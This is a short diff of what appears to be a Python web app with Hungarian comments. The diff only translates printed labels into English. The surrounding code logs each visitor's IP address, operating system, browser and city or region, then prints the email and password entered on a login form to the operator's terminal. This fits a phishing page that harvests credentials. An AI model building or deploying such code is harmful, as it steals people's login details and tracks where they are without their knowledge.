@@ -34,10 +34,10 @@ def login():
     os_info = platform.system()
 
     # Eredmények kiírása a terminálon
-    print(f"\033[36mIP-cím: {user_ip}")
-    print(f"Operációs rendszer: {os_info}")
-    print(f"Böngésző: {user_agent}")
-    print(f"Hely: {location_data.get('city', 'Ismeretlen város')}, {location_data.get('region', 'Ismeretlen régió')}")
+    print(f"\033[36mIp address: {user_ip}")
+    print(f"Operating system: {os_info}")
+    print(f"Browser: {user_agent}")
+    print(f"Location: {location_data.get('city', 'Ismeretlen város')}, {location_data.get('region', 'Ismeretlen régió')}")
     print("waiting for log in")
 
     # Továbbirányít a bejelentkezési oldalra
@@ -51,7 +51,7 @@ def submit():
 
     # Bejelentkezési adatok kiírása a terminálon
     print(f"\033[33mEmail: {email}")
-    print(f"Jelszó: {password}")
+    print(f"Password: {password}")
     print("—" * 30)
 
     # Továbbirányítás a bejelentkezés utáni oldalra
